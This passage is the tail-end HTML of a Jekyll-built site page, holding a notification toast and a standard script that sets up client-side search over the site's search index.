fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/R4vensP1t/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
